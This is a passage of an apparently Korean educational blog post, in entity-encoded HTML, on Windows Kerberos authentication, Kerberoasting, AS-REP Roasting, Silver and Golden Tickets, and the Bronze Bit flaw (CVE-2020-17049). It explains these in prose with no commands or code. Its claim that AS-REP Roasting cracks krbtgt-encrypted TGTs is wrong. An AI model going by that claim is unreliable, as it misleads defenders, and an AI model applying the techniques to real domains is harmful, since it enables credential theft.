&#xBA54;&#xC2DC;&#xC9C0;&#xC5D0; &#xC2E4;&#xC5B4;&#xC11C; KDC&#xC758; TGS &#xC5D0; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. &#xC774; &#xC694;&#xCCAD;&#xC5D0;&#xB294; &#xB300;&#xC0C1; &#xC11C;&#xBE44;&#xC2A4;&#xC758; SPN &#xACFC; &#xC55E;&#xC11C; &#xBC1C;&#xAE09;&#xB41C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;-TGS&#xAC04; &#xC138;&#xC158;&#xD0A4;&#xB3C4; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>4) TGS-REP</strong> </p><p>KDC&#xB294; TGS-REQ&#xB97C; &#xBC1B;&#xC544;&#xC11C; TGT&#xAC00; &#xC720;&#xD6A8;&#xD55C;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. TGT &#xB294; KDC &#xC758; &#xB9C8;&#xC2A4;&#xD130;&#xD0A4;&#xB85C; &#xC554;&#xD638;&#xD654; &#xB418;&#xC5B4; &#xC788;&#xAE30;&#xC5D0; KDC&#xAC00; &#xBCF5;&#xD638;&#xD654; &#xD558;&#xC5EC; &#xAC80;&#xC99D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xB2F9; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC694;&#xCCAD;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC774; &#xD655;&#xC778;&#xD558;&#xACE0; &#xBB38;&#xC81C;&#xAC00; &#xC5C6;&#xC73C;&#xBA74; TGS-REP &#xC751;&#xB2F5;&#xC744; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. </p><p>&#xC5EC;&#xAE30;&#xC5D0;&#xB294; <strong>&#xC138;&#xC158; &#xD0A4;</strong>(<strong>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;-&#xC11C;&#xBE44;&#xC2A4; &#xC11C;&#xBC84;</strong>)&#xC640; <strong>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;(ST)</strong>&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC740; &#xD574;&#xB2F9; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815;&#xC758; &#xBE44;&#xBC00; &#xD0A4;(&#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815;&#xC758; NTLM hash)&#xB85C; &#xC554;&#xD638;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBBC0;&#xB85C; <strong>&#xC11C;&#xBE44;&#xC2A4;&#xB9CC;</strong> &#xBCF5;&#xD638;&#xD654; &#xD558;&#xC5EC; &#xC5F4;&#xB78C;&#xD560; &#xC218; &#xC788;&#xACE0; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xB0B4;&#xC6A9;&#xC744; &#xC54C; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xC774; ST&#xB97C; &#xBC1B;&#xC544;&#xB450;&#xC5C8;&#xB2E4;&#xAC00; &#xC2E4;&#xC81C; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xC18D;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><strong>5) AP-REQ</strong></p><p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xB4E4;&#xACE0; AP-REQ &#xB97C; &#xB300;&#xC0C1; &#xC11C;&#xBC84;(&#xC11C;&#xBE44;&#xC2A4;)&#xC5D0; &#xC81C;&#xC2DC;&#xD558;&#xC5EC; &#xC811;&#xC18D;&#xC744; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xC790;&#xC2E0;&#xC758; &#xC2E0;&#xC6D0;&#xC744; &#xC99D;&#xBA85;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC55E;&#xC11C; &#xBC1B;&#xC740; &#xC11C;&#xBE44;&#xC2A4; &#xC138;&#xC158; &#xD0A4;&#xB85C; &#xC554;&#xD638;&#xD654;&#xD55C; &#xC778;&#xC99D;&#xC790;(Authenticator, &#xD0C0;&#xC784;&#xC2A4;&#xD0EC;&#xD504; &#xB4F1;)&#xB3C4; &#xD568;&#xAED8; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p>&#xC11C;&#xBC84;&#xB294; &#xB3C4;&#xBA54;&#xC778; &#xCEE8;&#xD2B8;&#xB864;&#xB7EC;&#xC5D0; KERB_VERIFY_PAC &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xC5EC; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13; &#xB0B4; PAC &#xC758; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC774; PAC&#xB294; KDC&#xC758; &#xC11C;&#xBA85;&#xC73C;&#xB85C; &#xBCF4;&#xD638;&#xB418;&#xBA70;, &#xC11C;&#xBE44;&#xC2A4;&#xB294; &#xD2F0;&#xCF13;&#xC744; &#xAC80;&#xC99D;&#xD560; &#xB54C; PAC&#xC758; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xD655;&#xC778;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xB3C4;&#xBA54;&#xC778; &#xB0B4; &#xAD8C;&#xD55C;&#xC744; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/ko/3.png" alt></p><p><strong>6) AP-REP</strong> </p><p>&#xC11C;&#xBE44;&#xC2A4; &#xC11C;&#xBC84;&#xC5D0;&#xC11C;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC81C;&#xC2DC;&#xD55C; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC758; PAC&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0; &#xAC80;&#xC99D;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xC11C;&#xBC84;&#xB294; AP-REP &#xBA54;&#xC2DC;&#xC9C0;&#xB85C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0;&#xAC8C; &#xC751;&#xB2F5;&#xC744; &#xBCF4;&#xB0B4; &#xC138;&#xC158; &#xD0A4; &#xD611;&#xC0C1;&#xC744; &#xC644;&#xB8CC;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xD574;&#xB2F9; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xD5C8;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. </p><hr><p>&#xC124;&#xBA85;&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xB4EF;&#xC774;, Windows &#xC5D0;&#xC11C;&#xC758; Kerberos &#xC778;&#xC99D;&#xC740; &#xC11C;&#xB85C; &#xACF5;&#xC720;&#xB418;&#xB294; &#xC554;&#xD638;&#xD0A4;&#xAC00; &#xC0AC;&#xC6A9;&#xC790;&#xC758; NTLM hash &#xC774;&#xBA70; PAC &#xB77C;&#xACE0; &#xD558;&#xB294; &#xAD8C;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xD2F0;&#xCF13;&#xC5D0; &#xB2F4;&#xACA8;&#xC788;&#xACE0; PAC&#xB294; KDC&#xAC00; &#xC11C;&#xBA85;&#xD558;&#xC5EC; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xD655;&#xBCF4;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="Kerberos-&#xAD00;&#xB828;-&#xACF5;&#xACA9;"><a href="#Kerberos-&#xAD00;&#xB828;-&#xACF5;&#xACA9;" class="headerlink" title="Kerberos &#xAD00;&#xB828; &#xACF5;&#xACA9;"></a>Kerberos &#xAD00;&#xB828; &#xACF5;&#xACA9;</h1><p>Kerberos &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xC790;&#xCCB4;&#xB294; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC124;&#xACC4;&#xB418;&#xC5C8;&#xC73C;&#xB098;, &#xAD6C;&#xD604;&#xC0C1; &#xC124;&#xC815;&#xC774;&#xB098; &#xC6B4;&#xC601; &#xD658;&#xACBD;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xC591;&#xD55C; &#xACF5;&#xACA9; &#xAE30;&#xBC95;&#xC774; &#xC5F0;&#xAD6C;&#xB418;&#xC5B4; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. Windows Kerberos &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC8FC;&#xB85C; &#xB2E4;&#xB904;&#xC9C0;&#xB294; &#xACF5;&#xACA9; &#xAE30;&#xBC95;&#xB4E4;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;.</p><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>Kerberoasting &#xC740; &#xD569;&#xBC95;&#xC801;&#xC778; &#xB3C4;&#xBA54;&#xC778; &#xC0AC;&#xC6A9;&#xC790; &#xACC4;&#xC815;&#xC73C;&#xB85C; <strong>&#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815;</strong>&#xC758; Kerberos &#xD2F0;&#xCF13;&#xC744; &#xC694;&#xCCAD;&#xD55C; &#xD6C4;, &#xD2F0;&#xCF13;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xC554;&#xD638;&#xD654;&#xB41C; &#xC815;&#xBCF4;&#xB97C; &#xD06C;&#xB799;&#xD558;&#xC5EC; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815;&#xC758; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xD0C8;&#xCDE8;&#xD558;&#xB294; &#xACF5;&#xACA9; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p>AD &#xB3C4;&#xBA54;&#xC778; &#xC548;&#xC5D0; &#xC788;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB77C;&#xBA74; SPN &#xC18D;&#xC131;&#xC774; &#xC788;&#xB294; &#xACC4;&#xC815;&#xC5D0; &#xB300;&#xD574;&#xC11C; TGS-REQ &#xB97C; &#xD1B5;&#xD574; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xC694;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xC989;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB3C4;&#xBA54;&#xC778; &#xB0B4;&#xB85C; &#xC774;&#xBBF8; &#xCE68;&#xD22C;&#xD55C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xBC95;&#xC774;&#xC8E0;.</p><p>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC740; NTLM hash &#xB85C; &#xC554;&#xD638;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD06C;&#xB799;&#xC774; &#xC131;&#xACF5;&#xD55C;&#xB2E4;&#xBA74; NTLM hash &#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xB294; &#xAC83;&#xC774;&#xBA70; &#xC774; hash &#xB97C; &#xC5BB;&#xC5C8;&#xB2E4;&#xB294; &#xAC83;&#xC740; Windows &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC5BB;&#xC5B4;&#xB0B8; &#xAC83;&#xACFC; &#xB2E4;&#xB984;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p><strong>AS-REP Roasting</strong>&#xC740; Kerberoasting&#xACFC; &#xC720;&#xC0AC;&#xD558;&#xC9C0;&#xB9CC;, <strong>Kerberos Pre-Authentication&#xC774; &#xBE44;&#xD65C;&#xC131;&#xD654;</strong>&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xD45C;&#xC801;&#xC73C;&#xB85C; &#xD558;&#xB294; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC804; &#xC778;&#xC99D;&#xC740; TGT &#xAC00; &#xBC1C;&#xAE09;&#xB418;&#xAE30; &#xC804;&#xC5D0; &#xC0AC;&#xC804;&#xC5D0; &#xACF5;&#xC720;&#xB41C; key &#xB97C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC54C;&#xACE0; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</p><p>AD &#xACC4;&#xC815; &#xC18D;&#xC131; &#xC911; &#x201C;Do not require Kerberos pre authentication&#x201D; &#xC774;&#xB77C;&#xB294; &#xC635;&#xC158;&#xC774; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74; &#xC0AC;&#xC804; &#xC778;&#xC99D; &#xC5C6;&#xC774; TGT &#xB97C; &#xBC1C;&#xAE09;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB2C8;&#xAE4C;, &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC5C6;&#xC774;&#xB3C4; TGT&#xB97C; &#xBC1C;&#xAE09;&#xBC1B;&#xC744; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xB9D0;&#xC785;&#xB2C8;&#xB2E4;.</p><p>TGT &#xB294; KDC&#xC758; &#xB9C8;&#xC2A4;&#xD130;&#xD0A4; &#xC989;, krbtgt &#xACC4;&#xC815;&#xC758; NTLM hash &#xB85C; &#xC554;&#xD638;&#xD654;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; TGT &#xD06C;&#xB799;&#xC5D0; &#xC131;&#xACF5;&#xD55C;&#xB2E4;&#xBA74; krbtgt &#xACC4;&#xC815;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xB294; &#xC148;&#xC785;&#xB2C8;&#xB2E4;. </p><h2 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h2><p>&#xB9CC;&#xC57D; &#xD2B9;&#xC815; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815;&#xC758; NTLM hash &#xB97C; &#xC5BB;&#xC5B4;&#xB0B8; &#xC0C1;&#xD669;&#xC774;&#xB77C;&#xBA74; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; PAC&#xB97C; &#xC870;&#xC791;&#xD55C; &#xB2E4;&#xB978; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC740; &#xC6D0;&#xB798; TGS &#xC5D0;&#xC11C; &#xBC1C;&#xAE09;&#xC744; &#xD574;&#xC8FC;&#xC9C0;&#xB9CC; TGS &#xB97C; &#xD1B5;&#xD558;&#xC9C0; &#xC54A;&#xACE0;&#xB3C4; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13; &#xC0DD;&#xC131;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13; &#xB0B4; PAC &#xB294; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815; &#xBE44;&#xBC00;&#xD0A4;&#xC640; krbtgt &#xACC4;&#xC815; &#xBE44;&#xBC00;&#xD0A4; 2&#xAC1C;&#xB85C; &#xC11C;&#xBA85;&#xC774; &#xB418;&#xB294;&#xB370;, &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815; &#xBE44;&#xBC00;&#xD0A4; &#xC11C;&#xBA85;&#xB9CC; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB300;&#xD45C;&#xC801;&#xC73C;&#xB85C; SeTcbPrivilege &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xADF8;&#xB7EC;&#xD55C;&#xB370;&#xC694;. &#xC774; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xACC4;&#xC815;&#xC740; &#xC11C;&#xBE44;&#xC2A4; &#xACC4;&#xC815; &#xBE44;&#xBC00;&#xD0A4; &#xC11C;&#xBA85;&#xB9CC; &#xAC80;&#xC99D;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Silver Ticket &#xC758; &#xB300;&#xC0C1;&#xC774; &#xB41C;&#xB2E4;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h2><p>krbtgt &#xACC4;&#xC815;&#xC758; NTLM hash &#xB97C; &#xC5BB;&#xC5B4;&#xB0C8;&#xB2E4;&#xBA74; TGT &#xC0DD;&#xC131;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; TGT &#xC5D0;&#xB3C4; PAC &#xAC00; &#xD3EC;&#xD568;&#xB418;&#xB294;&#xB370;&#xC694;. &#xC55E;&#xC11C; Silver Ticket &#xC740; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC758; PAC&#xB97C; &#xC870;&#xC791;&#xD588;&#xB2E4;&#xBA74; Golden Ticket &#xC740; TGT &#xC758; PAC&#xB97C; &#xC870;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC870;&#xC791;&#xB41C; PAC&#xB97C; &#xAC00;&#xC9C4; TGT&#xAC00; TGS &#xC5D0; &#xC804;&#xB2EC;&#xC774; &#xB418;&#xBA74; &#xD574;&#xB2F9; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC774; &#xBC1C;&#xAE09;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xB3C4;&#xBA54;&#xC778; &#xC5B4;&#xB4DC;&#xBBFC; &#xB4F1; &#xB354; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC0C1;&#xC2B9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Kerberos-&#xAD00;&#xB828;-&#xCDE8;&#xC57D;&#xC810;"><a href="#Kerberos-&#xAD00;&#xB828;-&#xCDE8;&#xC57D;&#xC810;" class="headerlink" title="Kerberos &#xAD00;&#xB828; &#xCDE8;&#xC57D;&#xC810;"></a>Kerberos &#xAD00;&#xB828; &#xCDE8;&#xC57D;&#xC810;</h1><p>Kerberos &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC740; &#xB0B4;&#xC6A9;&#xC774; &#xBC29;&#xB300;&#xD558;&#xACE0; Windows &#xC5D0;&#xC11C; &#xAD6C;&#xD604;&#xD55C; &#xAC01;&#xC885; &#xAD00;&#xB828; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xC18C;&#xAC1C;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC5B4;&#xB835;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30;&#xC5D0; CVE &#xBA87; &#xC885;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74;&#xC11C; &#xC5B4;&#xB5A4; &#xC138;&#xBD80; &#xC0AC;&#xD56D;&#xB4E4;&#xC774; &#xC788;&#xB294;&#xC9C0;&#xC640; &#xBC1C;&#xC0DD;&#xD588;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xB294; &#xC2DC;&#xAC04;&#xC744; &#xAC16;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="CVE-2020-17049"><a href="#CVE-2020-17049" class="headerlink" title="CVE-2020-17049"></a>CVE-2020-17049</h2><p>CVE-2020-17049&#xB294; Kerberos Delegation &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, &#x201C;Bronze Bit&#x201D; &#xACF5;&#xACA9;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>Delegtation &#xC740; &#xC9C1;&#xC5ED;&#xD558;&#xBA74; &#xC704;&#xC784;&#xC778;&#xB370;&#xC694;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0; &#xC778;&#xC99D;&#xC744; &#xD558;&#xACE0;, &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xAD8C;&#xD55C;&#xC5D0; &#xB530;&#xB77C; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD574;&#xC57C;&#xD560; &#xB54C;&#xAC00; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xC2DC;&#xB2E4;. &#xC774; &#xB54C; &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xAD8C;&#xD55C;&#xC744; &#x201C;&#xC704;&#xC784;&#x201D; &#xBC1B;&#xC544;&#xC11C; &#xC694;&#xCCAD;&#xC744; &#xD574;&#xC57C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xAE30; &#xC704;&#xD55C; Kerberos Delegation &#xC774; &#xC5EC;&#xB7EC; &#xC885; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (Unconstrained Delegation, Constrained Delegation, &#xC704;&#xC784; &#xD558;&#xC9C0; &#xC54A;&#xC74C; &#xB4F1;) </p><p>&#xC704;&#xC784;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC744; &#xC9C0;&#xC815;&#xD558;&#xB294; AllowedToDelegateTo &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xD2B9;&#xC815; &#xC11C;&#xBE44;&#xC2A4;A&#xAC00; &#xB2E4;&#xB978; &#xC11C;&#xBE44;&#xC2A4;B&#xC5D0; &#xC704;&#xC784;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xAC83;&#xC774;&#xC8E0;.</p><p>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC5D0; &#xC788;&#xB294; Forwardable Flag &#xB294; &#xC774; &#xD2F0;&#xCF13;&#xC774; Relay &#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB290;&#xB0D0;&#xB97C; &#xD45C;&#xAE30;&#xD558;&#xB294; &#xBE44;&#xD2B8;&#xC778;&#xB370;&#xC694;. Forwardable &#xC774; 1&#xC774;&#xB77C;&#xBA74; &#xAD8C;&#xD55C; &#xC704;&#xC784;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xB9D0;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC55E;&#xC11C; Kerberos Delegation &#xC635;&#xC158; &#xC911; &#xC704;&#xC784; &#xD558;&#xC9C0; &#xC54A;&#xC74C; &#xC635;&#xC158;&#xC774;&#xB098;, AllowedToDelegateTo &#xB85C; &#xC815;&#xC758;&#xAC00; &#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0; Forwardable&#xC774; 0&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7F0;&#xB370; Forwardable bit &#xB294; KDC&#xC758; &#xC11C;&#xBA85;, &#xC11C;&#xBE44;&#xC2A4;&#xC758; &#xC11C;&#xBA85; &#xB4F1;&#xC73C;&#xB85C; &#xBCF4;&#xD638;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC544;&#xC11C; &#xBCC0;&#xC870;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCBE4; &#xC624;&#xBA74; &#xC774; CVE&#xAC00; &#xC5B4;&#xB5A4; &#xCDE8;&#xC57D;&#xC810;&#xC778;&#xC9C0; &#xAC10;&#xC774; &#xC624;&#xC2DC;&#xB098;&#xC694;?</p><p>&#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC5D0; &#xC788;&#xB294;Forwardable Flag &#xB97C; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xBCF4;&#xB0B4;&#xBA74; &#xADF8; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xAD8C;&#xD55C; &#xC704;&#xC784;&#xC744; &#xD558;&#xACE0; &#xC788;&#xC9C0; &#xC54A;&#xB354;&#xB77C;&#xB3C4; &#xAC15;&#xC81C;&#xB85C; &#xAD8C;&#xD55C; &#xC704;&#xC784;&#xC744; &#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xAD8C;&#xD55C;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Windows &#xC5D0;&#xC11C;&#xB294; Kerberos Contrained Delegation (MS-SFU) &#xB294; S4U2proxy &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xB85C; &#xAD8C;&#xD55C; &#xC704;&#xC784;&#xC744; &#xAD6C;&#xD604;&#xD588;&#xB294;&#xB370;&#xC694;. &#xB9CC;&#xC57D; &#xC11C;&#xBE44;&#xC2A4; A&#xAC00; &#xC11C;&#xBE44;&#xC2A4; B&#xB85C; &#xAD8C;&#xD55C; &#xC704;&#xC784;&#xC774; &#xB420; &#xB54C; A &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xB9CC; &#xAC00;&#xC9C0;&#xACE0;&#xC11C;&#xB294; &#xC11C;&#xBE44;&#xC2A4; B&#xC5D0; &#xC694;&#xCCAD;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. S4U2proxy &#xB97C; &#xD1B5;&#xD574; KDC&#xC5D0; A &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xC81C;&#xC2DC;&#xD558;&#xACE0; B &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; Forwardable flag&#xB97C; 1&#xB85C; &#xC124;&#xC815;&#xD558;&#xC5EC; &#xAC15;&#xC81C;&#xC801;&#xC73C;&#xB85C; &#xAD8C;&#xD55C; 